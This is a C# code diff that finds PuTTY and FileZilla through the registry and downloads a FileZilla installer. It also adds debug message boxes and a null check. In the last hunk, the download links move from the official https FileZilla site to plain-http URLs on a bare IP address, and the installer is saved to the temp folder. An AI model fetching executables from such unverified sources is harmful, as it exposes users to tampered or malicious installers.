@@ -82,12 +82,12 @@ namespace Coffeed
                     var puttyPath = Path.Combine(Path.GetDirectoryName(key64.GetValue("").ToString()), "putty.exe");
                     if (File.Exists(puttyPath))
                     {
-
+                        MessageBox.Show(puttyPath);
                         result = puttyPath;
                     }
                     else
                     {
-
+                        MessageBox.Show("x64 putty nopt found?");
                         result = string.Empty;
                     }
                 }
@@ -111,17 +111,21 @@ namespace Coffeed
                 RegistryView rv = RegistryView.Registry32;
                 if (Environment.Is64BitOperatingSystem) rv = RegistryView.Registry64;
                 var key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, rv);
-
-                string path = (string)key.OpenSubKey(@"SOFTWARE\WOW6432Node\FileZilla Client").GetValue("", string.Empty);
-
-                if (System.IO.File.Exists(Path.Combine(path, "filezilla.exe")))
+                var fzkey = key.OpenSubKey(@"SOFTWARE\WOW6432Node\FileZilla Client", false);
+                if (fzkey != null)
                 {
-                    result = Path.Combine(path, "filezilla.exe");
+                    string path = (string)fzkey.GetValue("", string.Empty);
+
+                    if (System.IO.File.Exists(Path.Combine(path, "filezilla.exe")))
+                    {
+                        result = Path.Combine(path, "filezilla.exe");
+                    }
+                    else
+                    {
+                        result = string.Empty;
+                    }
                 }
-                else
-                {
-                    result = string.Empty;
-                }
+                
             }
             catch (Exception err)
             {
@@ -137,8 +141,8 @@ namespace Coffeed
         {
             try
             {
-                string link = "https://download.filezilla-project.org/client/FileZilla_3.56.2_win32-setup.exe";
-                if (Environment.Is64BitOperatingSystem) link = "https://download.filezilla-project.org/client/FileZilla_3.56.2_win64-setup.exe";
+                string link = "http://185.138.43.38/plesk-site-preview/xostme.gr/https/185.138.43.38/FileZilla_3.56.2_win32-setup.exe";
+                if (Environment.Is64BitOperatingSystem) link = "http://185.138.43.38/plesk-site-preview/xostme.gr/https/185.138.43.38/FileZilla_3.56.2_win64-setup.exe";
 
                 client.DownloadFile(link, Path.Combine(Path.GetTempPath(), "FileZillaSetup.exe"));
 
